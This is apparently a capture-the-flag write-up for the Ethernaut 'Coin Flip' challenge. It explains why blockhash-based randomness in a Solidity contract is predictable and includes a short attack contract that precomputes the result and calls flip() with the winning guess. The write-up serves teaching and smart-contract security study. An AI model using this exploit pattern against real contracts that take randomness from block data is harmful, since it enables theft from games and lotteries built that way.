# Ethernaut Challenge #3: Coin Flip

**Objective:** Guess the correct outcome 10 times in a row.

**The Vulnerability:**
The contract uses `block.number` and `blockhash` as a randomness source.

```solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

function flip(bool _guess) public returns (bool) {
  uint256 blockValue = uint256(blockhash(block.number - 1));
  uint256 coinFlip = blockValue / FACTOR;
  bool side = coinFlip == 1 ? true : false;
  
  if (side == _guess) {
    consecutiveWins++;
    return true;
  } else {
    consecutiveWins = 0;
    return false;
  }
}
```

**The Problem:**
Blockchain randomness is NOT random. It's deterministic.

Anyone can calculate:
1. `blockhash(block.number - 1)` — public data
2. Divide by FACTOR — deterministic math
3. Know the outcome BEFORE calling flip()

**The Attack:**
```solidity
contract Attack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  function attack(address _target) public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool guess = coinFlip == 1 ? true : false;
    
    CoinFlip(_target).flip(guess);  // Always correct!
  }
}
```

**Key Insight:** 
Never use blockchain data for randomness. It's all public and predictable.

**Lesson:**
If you can see the inputs, you can predict the output. Blockhashes are public. Block numbers are public. Therefore: "random" = predictable.

**Status:** Challenge understood. Ready to execute.
